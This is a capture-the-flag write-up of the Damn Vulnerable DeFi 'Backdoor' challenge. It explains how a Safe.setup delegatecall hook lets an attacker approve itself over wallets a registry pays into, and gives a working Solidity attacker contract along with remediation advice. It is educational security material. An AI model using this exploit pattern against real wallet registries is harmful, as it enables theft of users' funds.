# Backdoor — Running Code Inside a Wallet Before the Registry Looks at It

**Challenge:** Damn Vulnerable DeFi v4 — Backdoor
**Category:** Unsafe Initialization / Validation After the Fact
**Severity:** Critical (every reward token in the registry is stolen)

## What's going on

A registry rewards Safe (Gnosis) multisig wallets. Four known beneficiaries can each
create a wallet through the Safe proxy factory with the registry as the creation
callback, and the registry pays 10 DVT into every wallet it accepts, 40 DVT in total.
The player is not a beneficiary and has no tokens. The goal is to take all 40 DVT to a
recovery account **in a single transaction**.

## The bug

The registry validates the finished wallet. In `proxyCreated` it checks that the
initializer calls `Safe.setup`, that the threshold is 1, that there is exactly one owner
who is a beneficiary, and that no fallback handler is set:

```solidity
if (bytes4(initializer[:4]) != Safe.setup.selector) revert InvalidInitialization();
uint256 threshold = Safe(walletAddress).getThreshold();
address[] memory owners = Safe(walletAddress).getOwners();
...
address fallbackManager = _getFallbackManager(walletAddress);
if (fallbackManager != address(0)) revert InvalidFallbackManager(fallbackManager);
```

It never checks **what happened during setup**. `Safe.setup` has two optional
parameters, `to` and `data`. When `to` is set, the new wallet makes a delegatecall to it,
so arbitrary code runs inside the wallet's own context while it is being created:

```solidity
function setup(
    address[] calldata _owners, uint256 _threshold,
    address to, bytes calldata data,
    address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver
) external
```

That code can leave the owners, the threshold and the fallback handler exactly as the
registry expects, and still grant the attacker an allowance over the wallet's tokens.
Every check passes, the registry pays 10 DVT into the wallet, and the attacker spends it.

Anyone can call `createProxyWithCallback`, and it works for any beneficiary, so the
attacker can create all four users' wallets on their behalf.

## The attack

For each of the four users:

1. Build a `Safe.setup` initializer with `owners = [user]`, threshold 1, no fallback
   handler, `to` set to a helper contract, and `data` set to a call that runs
   `token.approve(attacker, max)`.
2. Call `createProxyWithCallback` with the registry as the callback. During setup the
   wallet delegatecalls the helper, so the **wallet** approves the attacker.
3. The factory calls `registry.proxyCreated`. All checks pass and 10 DVT are paid into
   the wallet.
4. The attacker calls `token.transferFrom(wallet, recovery, 10e18)`.

Two details make it work in one transaction:

- **Single transaction.** All of it runs in the constructor of an attacker contract, so
  deploying that contract is the player's only transaction.
- **A separate helper.** The delegatecall target must have code, and a contract has none
  while its constructor is running, so the attacker cannot point `to` at itself. It
  deploys a small helper first.

## PoC

```solidity
function test_backdoor() public checkSolvedByPlayer {
    new BackdoorAttacker(walletFactory, address(singletonCopy), address(walletRegistry), token, users, recovery);
}

contract BackdoorApprover {
    function approveSpender(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    constructor(/* ... */) {
        BackdoorApprover helper = new BackdoorApprover();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (owners, 1, address(helper),
                 abi.encodeCall(BackdoorApprover.approveSpender, (token, address(this))),
                 address(0), address(0), 0, payable(address(0)))
            );

            address wallet = address(
                factory.createProxyWithCallback(singleton, initializer, i, IProxyCreationCallback(registry))
            );

            token.transferFrom(wallet, recovery, token.balanceOf(wallet));
        }
    }
}
```

Full test file: `test/backdoor/Backdoor.t.sol`

## Why I'm calling this Critical

- **Total loss of the reward pool.** All 40 DVT go to the attacker, and the registry
  records every user as registered.
- **No privileges.** The attacker is not a beneficiary and needs no tokens.
- **One transaction.** The whole exploit runs in a single constructor.
- **The registry's checks give false assurance.** Each check passes, and the wallets look
  correct to anyone inspecting them afterwards, apart from the leftover allowance.

## Fix

- Validate the **initializer arguments**, not only the resulting state. Decode the
  `setup` call and require `to == address(0)` and an empty `data`, so no code can run
  during setup.
- Better, let the registry build and deploy the wallets itself with a fixed initializer,
  instead of accepting one chosen by the caller.
- Do not pay out to an address whose state a third party can shape before the payout.
  Anything the creator controls (setup hooks, modules, approvals) can survive the checks.

## Takeaway

When a protocol validates an externally created object (a wallet, proxy or vault) after
the fact, ask what the creator could set up **during creation** that the validation does
not see. Callbacks and setup hooks that delegatecall are the classic place for this.
Checking final state is not the same as checking how the state got there.
